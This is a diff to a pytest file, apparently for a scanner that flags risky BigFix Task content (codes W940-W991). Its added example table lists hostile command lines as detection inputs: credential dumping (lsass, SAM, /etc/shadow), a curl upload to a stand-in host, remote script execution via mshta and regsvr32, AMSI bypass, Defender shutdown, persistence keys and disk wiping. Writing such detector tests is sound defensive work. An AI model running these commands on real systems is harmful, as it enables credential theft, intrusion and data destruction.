@@ -6,8 +6,11 @@ script and session relevance in a Description (W901-W903), unhashed
 downloads (W910-W913), base64 in and out of an image context (W920, W921,
 W926), decoded payloads (W922, W925, W927), decode-and-run commands (W923),
 other encodings (W924), hardcoded secrets (W930), commands that weaken
-security (W931), remote script or ActiveX in a Description (W932), then the
-score, the bands, --fail-score, --weight, --disable, and main()'s exit codes.
+security (W931), remote script or ActiveX in a Description (W932), the
+BigFix-platform, credential, network, execution, persistence, destructive,
+Description and reviewability signals (W940-W991, one table of examples
+each), then the score, the bands, --fail-score, --weight, --disable, and
+main()'s exit codes.
 """
 
 import base64
@@ -28,7 +31,13 @@ PNG = base64.b64decode(
 )
 
 
-def bes(description="<p>Nothing to see.</p>", actionscript="", mime=None, extra=""):
+def bes(
+    description="<p>Nothing to see.</p>",
+    actionscript="",
+    mime=None,
+    extra="",
+    title="Example",
+):
     """A minimal Task with the given Description HTML and ActionScript body."""
     mime_attr = f' MIMEType="{mime}"' if mime else ""
     return (
@@ -36,7 +45,7 @@ def bes(description="<p>Nothing to see.</p>", actionscript="", mime=None, extra=
         '<BES xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" '
         'xsi:noNamespaceSchemaLocation="BES.xsd">\n'
         "<Task>\n"
-        "<Title>Example</Title>\n"
+        f"<Title>{title}</Title>\n"
         f"<Description><![CDATA[{description}]]></Description>\n"
         "<Relevance>true</Relevance>\n"
         f"{extra}"
@@ -410,6 +419,229 @@ def test_remote_script_or_activex_in_description(html):
 
 def test_local_inline_script_is_not_remote():
     assert "W932" not in codes(bes(description="<script>var a = 1;</script>"))
+
+
+# --- W940-W991 ---------------------------------------------------------------------
+
+# code -> ActionScript lines that must each raise it
+SCRIPT_CASES = {
+    "W940": [
+        "wait net stop besclient",
+        "wait systemctl disable besclient",
+        'delete "C:\\Program Files\\BigFix Enterprise\\BES Client\\__BESData\\x.fxf"',
+        "copy new.afxm actionsite.afxm",
+    ],
+    "W941": [
+        'setting "__RelayServer1"="http://relay.example.com:52311/bfmirror/downloads/"'
+        ' on "{now}" for client',
+    ],
+    "W942": [
+        "archive now",
+        'setting "_BESClient_ArchiveManager_FileSet-Logs"="C:\\logs\\*.log"'
+        ' on "{now}" for client',
+    ],
+    "W945": ['wait {value of setting "next_command" of client}'],
+    "W946": ['if {now > "01 Jan 2027 00:00:00 +0000" as time}'],
+    "W947": ['if {computer name = "HOST1"}'],
+    "W948": ['wait cmd /c {parameter "command"}'],
+    "W950": ["wait cp /etc/shadow /tmp/x", 'wait cat "/root/.ssh/id_rsa"'],
+    "W951": [
+        "wait procdump -ma lsass.exe out.dmp",
+        "wait reg save HKLM\\SAM sam.hiv",
+        "waithidden powershell -c $c = Get-Credential",
+        'wait osascript -e \'display dialog "Password" default answer "" with hidden answer\'',
+    ],
+    "W952": [
+        'regset "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control'
+        '\\SecurityProviders\\WDigest]" "UseLogonCredential"=dword:00000001',
+    ],
+    "W953": [
+        'wait curl -F "file=@/etc/hosts" https://example.com/u',
+        "waithidden powershell -c Invoke-RestMethod -Uri https://x.example -Method Post",
+        "wait scp /tmp/a user@host.example:/tmp/",
+    ],
+    "W956": [
+        "wait curl -k https://x.example/a",
+        "wait wget --no-check-certificate https://x",
+    ],
+    "W957": [
+        "wait certutil -addstore root ca.cer",
+        "wait security add-trusted-cert -d -r trustRoot ca.cer",
+    ],
+    "W958": [
+        "copy __appendfile C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "wait netsh winhttp set proxy proxy.example:8080",
+    ],
+    "W959": [
+        'regset "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server]"'
+        ' "fDenyTSConnections"=dword:00000000',
+        "waithidden powershell -c Enable-PSRemoting -Force",
+        "wait sed -i 's/.*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config",
+    ],
+    "W960": [
+        "waithidden powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+        "waithidden powershell -c Add-Type -TypeDefinition $src",
+    ],
+    "W961": [
+        "wait mshta http://x.example/a.hta",
+        "wait regsvr32 /s /n /u /i:http://x.example/a.sct scrobj.dll",
+        'wait wmic process call create "cmd /c x"',
+    ],
+    "W962": [
+        "waithidden powershell -c I`n`v`o`k`e-Item x",
+        "wait cmd /c p^o^w^e^r^s^h^e^l^l -c x",
+        "wait cmd /c %COMSPEC:~0,1%",
+    ],
+    "W964": [
+        "wait sc stop WinDefend",
+        "waithidden powershell -c Stop-Process -Name MsMpEng -Force",
+    ],
+    "W965": ["wait attrib +h +s C:\\x.exe", "wait touch -t 202001010000 /tmp/x"],
+    "W966": ["wait insmod /tmp/x.ko", "wait bcdedit /set testsigning on"],
+    "W967": [
+        "wait chmod 4755 /tmp/x",
+        "wait chmod -R 777 /opt/x",
+        "wait icacls C:\\x /grant Everyone:F",
+    ],
+    "W968": [
+        "wait nmap -sS 10.0.0.0/24",
+        "wait ./xmrig -o stratum+tcp://pool.example:3333",
+    ],
+    "W970": [
+        'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion'
+        '\\Image File Execution Options\\sethc.exe]" "Debugger"="cmd.exe"',
+        'wait sh -c "echo /tmp/x.so >> /etc/ld.so.preload"',
+    ],
+    "W971": [
+        'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run]"'
+        ' "X"="C:\\x.exe"',
+        "wait schtasks /create /tn x /tr x.exe /sc minute",
+        "wait sc create xsvc binPath= C:\\x.exe",
+    ],
+    "W972": [
+        "wait diskpart /s x.txt",
+        "wait dd if=/dev/zero of=/dev/sda bs=1M",
+        "wait cipher /w:C:\\",
+    ],
+    "W973": [
+        'wait sqlcmd -Q "DROP TABLE dbo.X"',
+        "wait sqlcmd -Q \"EXEC xp_cmdshell 'whoami'\"",
+    ],
+}
+
+
+@pytest.mark.parametrize(
+    ("code", "line"),
+    [(code, line) for code, lines in SCRIPT_CASES.items() for line in lines],
+)
+def test_script_signal(code, line):
+    assert code in codes(bes(actionscript=line))
+
+
+@pytest.mark.parametrize(
+    ("code", "line"),
+    [
+        ("W953", "wait unzip -d out a.zip"),
+        ("W962", "wait cmd /c echo %DATE:~10,4%"),
+        ("W962", 'waithidden powershell -c "a`r`nb`t"'),
+        (
+            "W971",
+            'regdelete "[HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows'
+            '\\CurrentVersion\\Run]" "Dropbox"',
+        ),
+        (
+            "W959",
+            'regset "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control'
+            '\\Terminal Server]" "fDenyTSConnections"=dword:00000001',
+        ),
+        ("W948", "wait cmd /c echo {name of operating system}"),
+    ],
+)
+def test_script_signal_near_miss(code, line):
+    assert code not in codes(bes(actionscript=line))
+
+
+@pytest.mark.parametrize(
+    ("code", "relevance"),
+    [
+        ("W947", 'computer name = "HOST1"'),
+        ("W950", 'exists file "/etc/shadow"'),
+        ("W946", 'now > "01 Jan 2027 00:00:00 +0000" as time'),
+    ],
+)
+def test_relevance_signal(code, relevance):
+    extra = f"<Relevance><![CDATA[{relevance}]]></Relevance>\n"
+    assert code in codes(bes(extra=extra))
+
+
+@pytest.mark.parametrize(
+    ("code", "kwargs"),
+    [
+        (
+            "W943",
+            {"actionscript": "wait curl -X POST https://bes.example:52311/api/actions"},
+        ),
+        ("W944", {"extra": "<Target><AllComputers>true</AllComputers></Target>\n"}),
+        ("W954", {"actionscript": "wait curl -o a https://pastebin.com/raw/abc"}),
+        ("W954", {"actionscript": "wait curl -o a https://x.ngrok-free.app/a"}),
+        ("W955", {"actionscript": "wait curl -o a https://user:pw@example.com/a"}),
+        ("W963", {"actionscript": "wait cmd /c echo \u202eexe.txt"}),
+    ],
+)
+def test_file_signal(code, kwargs):
+    assert code in codes(bes(**kwargs))
+
+
+def test_bom_at_start_is_not_a_hidden_character():
+    assert "W963" not in codes("\ufeff" + bes())
+
+
+@pytest.mark.parametrize(
+    ("code", "html"),
+    [
+        ("W980", '<input type="password" id="pw">'),
+        ("W981", '<img src="\\\\server.example\\share\\x.png">'),
+        ("W981", '<a href="file://server.example/x">x</a>'),
+        ("W982", '<img src="https://example.com/p.gif">'),
+        ("W983", '<meta http-equiv="refresh" content="0;url=https://x.example">'),
+        ("W983", '<form action="https://x.example/post"></form>'),
+        ("W983", '<base href="https://x.example/">'),
+        ("W984", '<div style="display:none">x</div>'),
+    ],
+)
+def test_description_signal(code, html):
+    assert code in codes(bes(description=html))
+
+
+def test_data_image_is_not_a_remote_image():
+    html = f'<img src="data:image/png;base64,{b64(PNG)}">'
+    assert "W982" not in codes(bes(description=html))
+
+
+def test_large_createfile_payload():
+    body = "createfile until EOF\n" + "echo line\n" * 201 + "EOF\nwait sh x.sh"
+    assert "W990" in codes(bes(actionscript=body))
+    small = "createfile until EOF\n" + "echo line\n" * 50 + "EOF\nwait sh x.sh"
+    assert "W990" not in codes(bes(actionscript=small))
+
+
+def test_read_only_title_that_writes():
+    writes = 'regset "[HKEY_LOCAL_MACHINE\\SOFTWARE\\X]" "a"=dword:00000001'
+    assert "W991" in codes(bes(title="Check Something", actionscript=writes))
+    reads = "wait cmd /c echo hi"
+    assert "W991" not in codes(bes(title="Check Something", actionscript=reads))
+    assert "W991" not in codes(bes(title="Set Something", actionscript=writes))
+
+
+def test_upload_plus_credential_store_combination():
+    body = "wait cp /etc/shadow /tmp/x\narchive now"
+    found = codes(bes(actionscript=body))
+    assert {"W942", "W950", "W949"} <= set(found)
+    assert "W949" not in codes(bes(actionscript="archive now"))
+
+
+def test_upload_alone_stays_low():
+    assert score(bes(actionscript="archive now")) == hook.WEIGHTS["W942"] < hook.MEDIUM
 
 
 # --- score, bands, options --------------------------------------------------------
